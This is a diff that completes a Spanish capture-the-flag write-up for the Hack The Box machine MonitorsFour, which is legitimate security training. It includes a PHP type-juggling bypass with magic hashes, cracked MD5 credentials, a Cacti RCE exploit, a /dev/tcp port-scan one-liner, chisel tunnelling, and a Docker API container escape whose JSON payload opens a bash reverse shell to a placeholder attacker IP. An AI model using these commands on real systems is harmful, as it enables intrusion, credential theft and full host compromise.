@@ -1,7 +1,7 @@
 ---
 layout: single
 title: MonitorsFour - Hack The Box
-excerpt: "."
+excerpt: "Esta fue una máquina algo complicada. Después de analizar los escaneos, nos dirigimos directamente a la página web activa del puerto 80, siendo ahí donde descubrimos un login y el uso de PHP versión 8.3.27, pero al no encontrar nada más, decidimos aplicar Fuzzing. Aplicando Fuzzing, descubrimos un subdominio que es un login y utiliza la herramienta Cacti Network Management, también descubrimos algunos archivos dentro del dominio principal, siendo uno de estos un endpoint que resulta ser una API, al cual también descubrimos un parámetro aplicando Fuzzing. Resulta que el parámetro utiliza PHP Type Juggling, por lo que utilizamos Magic Hashes para aplicar un bypass al parámetro que encontramos, siendo así que logramos obtener toda la información de la API. En esa información, vemos usuarios y sus contraseñas en Hashes MD5, pero al intentar crackearlas, solo obtenemos un resultado exitoso, siendo un usuario y contraseña que nos sirven para ganar acceso al login de Cacti. Investigamos la versión usada de Cacti, viendo que es vulnerable al CVE-2025-24367, lo que nos permite ganar acceso principal a la máquina víctima. Dentro, identificamos que estamos dentro de un contenedor de Docker y a su vez, descubrimos una segunda interfaz que resulta ser una API Docker que es vulnerable al CVE-2025-9074, lo que nos permite crear una montura del directorio del Root, siendo así que logramos escalar privilegios."
 date: 2025-12-12
 classes: wide
 header:
@@ -13,21 +13,51 @@ categories:
   - Easy Machine
 tags:
   - Windows
-  - 
-  - 
+  - Docker
+  - API Docker
+  - Web Enumeration
+  - Fuzzing
+  - Information Leakage
+  - Subdomain Fuzzing
+  - Cacti Network Management
+  - Parameter Fuzzing
+  - PHP Type Juggling
+  - Magic Hashes Bypass
+  - API Broken Authentication
+  - Cracking Hash
+  - Cracking MD5 Hash
+  - Cacti Authenticated Graph Template RCE
+  - CVE-2025-24367
+  - Privesc - Docker Remote API Escape
+  - Privesc - CVE-2025-9074
   - OSCP Style
 ---
-![](/assets/images/htb-writeup-monitorsFour/monitorsFour.png)
+<p align="center">
+<img src="/assets/images/htb-writeup-monitorsFour/monitorsFour.png">
+</p>
 
-texto
+Esta fue una máquina algo complicada. Después de analizar los escaneos, nos dirigimos directamente a la página web activa del **puerto 80**, siendo ahí donde descubrimos un login y el uso de **PHP versión 8.3.27**, pero al no encontrar nada más, decidimos aplicar **Fuzzing**. Aplicando **Fuzzing**, descubrimos un subdominio que es un login y utiliza la herramienta **Cacti Network Management**, también descubrimos algunos archivos dentro del dominio principal, siendo uno de estos un endpoint que resulta ser una **API**, al cual también descubrimos un parámetro aplicando **Fuzzing**. Resulta que el parámetro utiliza **PHP Type Juggling**, por lo que utilizamos **Magic Hashes** para aplicar un bypass al parámetro que encontramos, siendo así que logramos obtener toda la información de la **API**. En esa información, vemos usuarios y sus contraseñas en **Hashes MD5**, pero al intentar crackearlas, solo obtenemos un resultado exitoso, siendo un usuario y contraseña que nos sirven para ganar acceso al login de **Cacti**. Investigamos la versión usada de **Cacti**, viendo que es vulnerable al **CVE-2025-24367**, lo que nos permite ganar acceso principal a la máquina víctima. Dentro, identificamos que estamos dentro de un contenedor de **Docker** y a su vez, descubrimos una segunda interfaz que resulta ser una **API Docker** que es vulnerable al **CVE-2025-9074**, lo que nos permite crear una montura del directorio del **Root**, siendo así que logramos escalar privilegios.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
-* **
-* **
-* **
-* **
+* *wappalizer*
+* *ffuf*
+* *gobuster*
+* *curl*
+* *cat*
+* *ChatGPT*
+* *jq*
+* *crackstation*
+* *JohnTheRipper*
+* *wget*
+* *nc*
+* *Python3*
+* *sudo*
+* *id*
+* *ip*
+* *chisel*
+* *proxychains*
 
 
 <br>
@@ -43,17 +73,23 @@ Herramientas utilizadas:
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+				<li><a href="#fuzz">Fuzzing</a></li>
+				<ul>
+					<li><a href="#fuzz2">Aplicando Fuzzing a la Página Web para Descubrir Archivos o Directorios Ocultos</a></li>
+					<li><a href="#fuzz3">Aplicando Fuzzing para Identificar Subdominios</a></li>
+					<li><a href="#fuzz4">Aplicando Fuzzing a Página user para Encontrar Parámetro Oculto</a></li>
+				</ul>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#TypeJuggling">Aplicando Bypass a PHP Type Juggling con Magic Hashes para Ver Contenido de API user (API Broken Authentication)</a></li>
+				<li><a href="#Cracking">Crackeando Hash MD5 y Ganando Acceso a Login de Cacti Network Management</a></li>
+				<li><a href="#cactiExploit">Probando Exploit: CVE-2025-24367 - Cacti Authenticated Graph Template RCE</a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
+				<li><a href="#DockerAPI">Probando Exploit: CVE-2025-9074 - Docker Remote API Escape</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -159,7 +195,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.27 seconds
 
 <br>
 
-El escaneo nos esta indicando que cuando entremos a la página web, nos va a redirigir a un dominio.
+El escaneo nos está indicando que cuando entremos a la página web, nos va a redirigir a un dominio.
 
 Registremos ese dominio en el `/etc/hosts`:
 ```bash
@@ -349,7 +385,7 @@ Parece que necesitamos encontrar el parámetro de esta página, pero antes de se
 
 <h3 id="fuzz3">Aplicando Fuzzing para Identificar Subdominios</h3>
 
-Para esto, primero usaremos la herramienta **ffuf**:
+Para esto, primero usaremos la herramienta **ffuf** y el wordlist `/seclists/Discovery/DNS/subdomains-top1million-5000.txt`:
 ```bash
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://monitorsfour.htb/FUZZ -H "Host: FUZZ.monitorsfour.htb" -t 300 -fs 138
 
@@ -421,13 +457,13 @@ Finished
 
 Encontramos un subdominio.
 
-Registralo en el `/etc/hosts` y luego visitalo:
+Regístralo en el `/etc/hosts` y luego visítalo:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-monitorsFour/Captura5.png">
 </p>
 
-Parece que encontramos otro login y esta utilizando una herramienta llamada **cacti**.
+Parece que encontramos otro login y está utilizando una herramienta llamada **cacti**.
 
 Antes de seguir investigando, tratemos de obtener el parámetro que hace falta en la página `/user`.
 
@@ -517,7 +553,7 @@ Pero observa lo que pasa cuando lo probamos:
 
 Necesitamos encontrar un token válido para poder ver información.
 
-También descubrimos que este endpoint `/user` es una **API**, que suponiendo que tengamos el token correcto, podríamos ver información de los usuarios registrados.
+También descubrimos que este endpoint `/user` es una **API** que, suponiendo que tengamos el token correcto, podríamos ver información de los usuarios registrados.
 
 Con todo lo que hemos descubierto, haremos lo siguiente:
 * Identificar un token válido para el endpoint `/user`.
@@ -532,13 +568,12 @@ Con todo lo que hemos descubierto, haremos lo siguiente:
   <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
-
-
 <br>
 
-<h2 id="TypeJuggling">Aplicando Bypass a PHP Type Juggling con Magic Hashes para Ver Contenido de API user y Crackeando Hash MD5</h2>
 
-Investigando como es posible el funcionamiento de este parámetro y viendo el uso de **PHP Ver. 8.3.27**, vemos que se esta aplicando **PHP Type Juggling**.
+<h2 id="TypeJuggling">Aplicando Bypass a PHP Type Juggling con Magic Hashes para Ver Contenido de API user (API Broken Authentication) y Crackeando Hash MD5</h2>
+
+Investigando cómo es posible el funcionamiento de este parámetro y viendo el uso de **PHP Ver. 8.3.27**, vemos que se está aplicando **PHP Type Juggling**.
 
 ¿Qué es **PHP Type Juggling**?
 
@@ -551,9 +586,9 @@ Investigando como es posible el funcionamiento de este parámetro y viendo el us
 Aquí tienes un repositorio que explica las vulnerabilidades que se pueden aplicar en **PHP Type Juggling**:
 * <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md" target="_blank">Repositorio de payloadallthethings: Type Juggling</a>
 
-En este repositorio se nos explica que, a partir de la **versión 8 de PHP**, se utilizan **comparación aproximada (loose comparison)** en lugar de **comparación estricta (stric comparison)**.
+En este repositorio se nos explica que, a partir de la **versión 8 de PHP**, se utiliza **comparación aproximada (loose comparison)** en lugar de **comparación estricta (stric comparison)**.
 
-Pero, si un usuario tiene control de las variables que utilizan esto, podemos aprovechar una implementación debil para obtener resultados positivos cuando no deberiamos obtenerlos.
+Pero, si un usuario tiene control de las variables que utilizan esto, podemos aprovechar una implementación débil para obtener resultados positivos cuando no deberíamos obtenerlos.
 
 Para esto, utilizaremos **Magic Hashes**:
 
@@ -563,7 +598,7 @@ Para esto, utilizaremos **Magic Hashes**:
 
 <br>
 
-Le pedi a **ChatGPT** que generara un wordlist de **Magic Hashes**, así que te lo comparto:
+Le pedí a **ChatGPT** que generara un wordlist de **Magic Hashes**, así que te lo comparto:
 ```bash
 cat php_magic_hashes.txt
 240610708
@@ -703,17 +738,21 @@ curl -s "http://monitorsfour.htb/user?token=0" | jq
 ```
 Genial, podemos ver el contenido del endpoint `/user` y son los datos de usuarios registrados.
 
-Parece que sus contraseñas estan convertidas en **Hash MD5**.
+Parece que sus contraseñas están convertidas en **Hash MD5**.
 
 Guardemos los **Hashes MD5** en un archivo de texto:
 ```bash
 curl -s "http://monitorsfour.htb/user?token=0" | jq -r '.[].password' > hashes.txt
 ```
 
-Para crackearlos, usaremos la página web **crackstation**:
-* <a href="" target="_blank"></a>
+<br>
 
-Copialos y pegalos en la página:
+<h2 id="Cracking">Crackeando Hash MD5 y Ganando Acceso a Login de Cacti Network Management</h2>
+
+Para crackearlos, usaremos la página web **crackstation**:
+* <a href="https://crackstation.net/" target="_blank">Crackstation</a>
+
+Cópialos y pégalos en la página:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-monitorsFour/Captura7.png">
@@ -753,7 +792,7 @@ Busquemos una forma de explotar estos dos accesos que tenemos.
 
 Durante la investigación del dominio y del uso de la herramienta **cacti**, vemos que existe una vulnerabilidad reciente para la versión usada de **cacti**.
 
-Pero, veamos de que trata esta herramienta:
+Pero, veamos de qué trata esta herramienta:
 
 | **Cacti Network Management** |
 |:----------------------------:|
@@ -761,9 +800,9 @@ Pero, veamos de que trata esta herramienta:
 
 <br>
 
-La vulnerabidad reciente **CVE-2025-24367**, permite inyectar comandos si tenemos un usuario válido, lo que nos puede permitir inyectar y ejecutar una **Reverse Shell**.
+La vulnerabilidad reciente **CVE-2025-24367** permite inyectar comandos si tenemos un usuario válido, lo que nos puede permitir inyectar y ejecutar una **Reverse Shell**.
 
-Curiosamente, uno de los autores que creo esta máquina, creo un script de **Python** que explota esta vulnerabilidad y ejecuta una **Reverse Shell**:
+Curiosamente, uno de los autores que creó esta máquina, creó un script de **Python** que explota esta vulnerabilidad y ejecuta una **Reverse Shell**:
 * <a href="https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC" target="_blank">Repositorio de TheCyberGeek: CVE-2025-24367-Cacti-PoC</a>
 
 Podemos descargarlo con **wget**:
@@ -777,9 +816,9 @@ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-En el repositorio se nos indica que, tenemos que darle las credenciales de acceso, la url del dominio vulnerable, nuestra IP y un puerto a usar.
+En el repositorio se nos indica que tenemos que darle las credenciales de acceso, la url del dominio vulnerable, nuestra IP y un puerto a usar.
 
-Probemoslo:
+Probémoslo:
 ```bash
 python3 exploit.py -u marcus -p wonderful1 -url http://cacti.monitorsfour.htb -i Tu_IP -l 443
 [+] Cacti Instance Found!
@@ -852,18 +891,27 @@ www-data@821fbd6a43fa:/home/marcus$ cat user.txt
 <br>
 
 
-<h2 id=""></h2>
+<h2 id="DockerAPI">Probando Exploit: CVE-2025-9074 - Docker Remote API Escape</h2>
 
+Veamos si nuestro usuario tiene privilegios:
 ```bash
 www-data@821fbd6a43fa:/home/marcus$ sudo -l
 bash: sudo: command not found
 ```
+No tiene ninguno; de hecho, no tenemos el comando **sudo** disponible porque, si te das cuenta, estamos dentro de un contenedor de **Docker**.
 
+Esto lo sabemos por cómo se ve el **prompt** y por la falta de varios comandos.
+
+Veamos a qué grupos pertenece nuestro usuario:
 ```bash
 www-data@821fbd6a43fa:/home/marcus$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+No hay algo que nos ayude.
 
+Para los siguientes pasos, te recomiendo moverte al directorio `/tmp` y crear tu propio directorio.
+
+Veamos la IP de esta máquina:
 ```bash
 www-data@821fbd6a43fa:/tmp/Brsk$ ip a 
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
@@ -877,18 +925,9 @@ www-data@821fbd6a43fa:/tmp/Brsk$ ip a
     inet 172.18.0.3/16 brd 172.18.255.255 scope global eth0
        valid_lft forever preferred_lft forever
 ```
+Observa que podemos ver una interfaz que es de un contenedor de **Docker**.
 
-```bash
-www-data@821fbd6a43fa:/tmp/Brsk$ cat /etc/hosts
-127.0.0.1	localhost
-::1	localhost ip6-localhost ip6-loopback
-fe00::	ip6-localnet
-ff00::	ip6-mcastprefix
-ff02::1	ip6-allnodes
-ff02::2	ip6-allrouters
-172.18.0.3	821fbd6a43fa
-```
-
+Otro archivo que podemos ver para asegurarnos de que es un contenedor de **Docker** es el archivo `/etc/resolv.cong`:
 ```bash
 www-data@821fbd6a43fa:/tmp/Brsk$ cat /etc/resolv.conf
 # Generated by Docker Engine.
@@ -903,7 +942,9 @@ options ndots:0
 # Overrides: []
 # Option ndots from: internal
 ```
+Muy bien, descubrimos una interfaz interna aparte de la interfaz de **Docker**.
 
+Podemos ver qué puertos están abiertos en esta IP con el siguiente oneliner:
 ```bash
 www-data@821fbd6a43fa:/tmp/Brsk$ for port in {1..65535}; do echo > /dev/tcp/192.168.65.7/$port && echo "Port: $port open"; done 2>/dev/null
 Port: 53 open
@@ -911,12 +952,19 @@ Port: 2375 open
 Port: 3128 open
 Port: 5555 open
 ```
+Bien, hay 4 puertos abiertos.
 
+Para ver qué servicios se están ocupando en estos puertos, podemos utilizar **chisel** para aplicar **Port Forwarding** utilizando **SOCKS** para crear un túnel y exponer toda la red de la máquina.
+
+Te dejo el link de la herramienta **chisel**:
+* <a href="https://github.com/jpillora/chisel" target="_blank">Repositorio de jpillora: chisel</a>
+
+Una vez que descargues **chisel** en tu máquina, lo puedes mandar a la máquina víctima usando un servidor de **Python3** en tu máquina y en la máquina víctima realizas una petición con **curl** y el resultado lo guardas con el nombre de **chisel**:
 ```bash
-www-data@821fbd6a43fa:/tmp/Brsk$ curl -s http://192.168.65.7:2375
-{"message":"page not found"}
+www-data@821fbd6a43fa:/tmp/Brsk$ curl http://Tu_IP/chisel > chisel
 ```
 
+Entonces, inicia **chisel** en tu máquina como servidor **SOCKS**:
 ```bash
 ./chisel server -p 4444 --reverse --socks5
 2025/12/14 22:57:23 server: Reverse tunnelling enabled
@@ -925,12 +973,15 @@ www-data@821fbd6a43fa:/tmp/Brsk$ curl -s http://192.168.65.7:2375
 2025/12/14 22:57:35 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
 ```
 
+Conéctate al servidor indicando la creación de un túnel **SOCKS**:
 ```bash
 www-data@821fbd6a43fa:/tmp/Brsk$ ./chisel client Tu_IP:4444 R:socks
 2025/12/15 04:57:35 client: Connecting to ws://Tu_IP:4444
 2025/12/15 04:57:37 client: Connected (Latency 374.347447ms)
 ```
+Listo, ya podemos aplicar un escaneo con **nmap** a los puertos que vimos de la segunda IP.
 
+Para realizar el escaneo, utiliza la herramienta **proxychains**:
 ```bash
 proxychains nmap -sT -Pn -n -sV -p 53,2375,3128,5555 192.168.65.7
 [proxychains] config file found: /etc/proxychains4.conf
@@ -952,40 +1003,85 @@ PORT     STATE SERVICE  VERSION
 3128/tcp open  http     nginx
 5555/tcp open  freeciv?
 ```
+El puerto más interesante es el **puerto 2375** que utiliza **Docker 28.3.2**.
 
+Investigando este puerto con **ChatGPT**, vemos que se trata de un **Docker API** al que podemos tratar de ver con **curl**:
+```bash
+www-data@821fbd6a43fa:/tmp/Brsk$ curl -s http://192.168.65.7:2375
+{"message":"page not found"}
+```
+Nos responde, por lo que tenemos acceso a este.
+
+| **Docker API** |
+|:--------------:|
+| *Un Docker API es la interfaz de control remoto de Docker. Permite gestionar Docker programáticamente (crear contenedores, iniciar/parar servicios, ver imágenes, ejecutar comandos, etc.) mediante peticiones HTTP/REST.* |
+
+<br>
+
+Podemos ver información del **Docker API** si apuntamos al endpoint **version**, que si nos responde, también es un indicativo de que no esta bien configurado:
 ```bash
 www-data@821fbd6a43fa:/tmp/Brsk$ curl http://192.168.65.7:2375/version
 {"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"28.3.2","Details":{"ApiVersion":"1.51","Arch":"amd64","BuildTime":"2025-07-09T16:13:55.000000000+00:00","Experimental":"false","GitCommit":"e77ff99","GoVersion":"go1.24.5","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","MinAPIVersion":"1.24","Os":"linux"}},{"Name":"containerd","Version":"1.7.27","Details":{"GitCommit":"05044ec0a9a75232cad458027ca83437aae3f4da"}},{"Name":"runc","Version":"1.2.5","Details":{"GitCommit":"v1.2.5-0-g59923ef"}},{"Name":"docker-init","Version":"0.19.0","Details":{"GitCommit":"de40ad0"}}],"Version":"28.3.2","ApiVersion":"1.51","MinAPIVersion":"1.24","GitCommit":"e77ff99","GoVersion":"go1.24.5","Os":"linux","Arch":"amd64","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","BuildTime":"2025-07-09T16:13:55.000000000+00:00"}
 ```
+Nos respondió.
 
+El simple hecho de que nos responda ya dice que está mal configurado porque no debería hacerlo.
+
+Investigando un poco y con la ayuda de **ChatGPT**, vemos que es posible que sea vulnerable al **CVE-2025-9074**.
+
+Aquí te dejo un blog que explica cómo aplicar esta vulnerabilidad:
+* <a href="https://blog.qwertysecurity.com/Articles/blog3.html" target="_blank">When a SSRF is enough: Full Docker Escape on Windows Docker Desktop (CVE-2025-9074)</a>
+
+En resumen, podemos aplicar un **SSRF** con el que podemos ejecutar comandos.
+
+De acuerdo al blog, podemos crear una montura completa del directorio `/root`, lo que nos permite escalar privilegios dentro de este contenedor.
+
+Ahí mismo, vienen los pasos para aplicar esta vulnerabilidad.
+
+El problema es que se necesita una imagen para crear la montura, por lo que podemos revisar si existe alguna dentro de este mismo contenedor:
+```bash
+www-data@821fbd6a43fa:~/html$ curl http://192.168.65.7:2375/images/json
+[{"Containers":1,"Created":1762794130,"Id":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","Labels":{"com.docker.compose.project":"docker_setup","com.docker.compose.service":"nginx-php","com.docker.compose.version":"2.39.1"},
+"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","size":856},
+"RepoDigests":["docker_setup-nginx-php@sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666"],"RepoTags":["docker_setup-nginx-php:latest"]...
+```
+Vemos que hay una imagen llamada **docker_setup-nginx-php**, siendo la que usaremos para crear nuestra montura.
+
+Primero, creamos un **archivo JSON** que contiene las instrucciones para crear una montura del directorio `/root` y vamos a agregar la ejecución de una **Reverse Shell**:
 ```bash
 cat create_container.json
 { "Image": "docker_setup-nginx-php:latest", "Cmd": ["/bin/bash","-c","bash -i >& /dev/tcp/Tu_IP/1337 0>&1"], "HostConfig": { "Binds": ["/mnt/host/c:/host_root"] } }
 ```
 
+Descargamos este archivo en la máquina víctima:
 ```bash
 www-data@821fbd6a43fa:/tmp/Brsk$ curl http://Tu_IP/create_container.json -o create_container.json
 ```
 
+Ahora, ejecutamos nuestro **archivo JSON** utilizando el **Docker API** para que se cree el contenedor y este mismo tiene cargada la **Reverse Shell**; la respuesta la guardamos en otro archivo:
 ```bash
 www-data@821fbd6a43fa:/tmp/Brsk$ curl -H "Content-Type: application/json" -d @create_container.json http://192.168.65.7:2375/containers/create -o resp.json
 ```
 
+La ejecución fue exitosa, por lo que nos da un ID que podemos ver en el archivo de respuesta:
 ```bash
 www-data@821fbd6a43fa:/tmp/Brsk$ cat resp.json 
 {"Id":"3df7054...","Warnings":[]}
 ```
 
+Levanta un listener con **netcat**:
 ```bash
 nc -nlvp 1337
 listening on [any] 1337 ...
 ```
 
+Carga en una variable el **ID** que obtuvimos e iniciamos el contenedor utilizando ese **ID**:
 ```bash
 www-data@821fbd6a43fa:/tmp/Brsk$ cid=3df7054...
 www-data@821fbd6a43fa:/tmp/Brsk$ curl -X POST http://192.168.65.7:2375/containers/$cid/start
 ```
 
+Observa la **netcat**:
 ```bash
 nc -nlvp 1337
 listening on [any] 1337 ...
@@ -996,7 +1092,9 @@ root@3df7054cf3c9:/var/www/html# whoami
 whoami
 root
 ```
+Estamos dentro y somos **Root**.
 
+Si revisamos el directorio `/host_root`, que es el directorio `/root` de la máquina víctima, vemos que ahí están los archivos de una máquina **Windows**:
 ```bash
 root@3df7054cf3c9:/# cd host_root
 cd host_root
@@ -1019,6 +1117,7 @@ inetpub
 pagefile.sys
 ```
 
+Por último, obtengamos la última flag:
 ```bash
 root@3df7054cf3c9:/host_root# cd Users/Administrator/Desktop
 cd Users/Administrator/Desktop
@@ -1030,7 +1129,7 @@ root@3df7054cf3c9:/host_root/Users/Administrator/Desktop# cat root.txt
 cat root.txt
 ...
 ```
-
+Y con esto, terminamos la máquina.
 
 
 <br>
@@ -1046,6 +1145,7 @@ cat root.txt
 * https://crackstation.net/
 * https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC
 * https://github.com/Cacti/cacti/security/advisories/GHSA-c7rr-2h93-7gjf
+* https://github.com/jpillora/chisel
 * https://github.com/PtechAmanja/CVE-2025-9074-Docker-Desktop-Container-Escape
 * https://github.com/j3r1ch0123/CVE-2025-9074?tab=readme-ov-file
 * https://blog.qwertysecurity.com/Articles/blog3.html
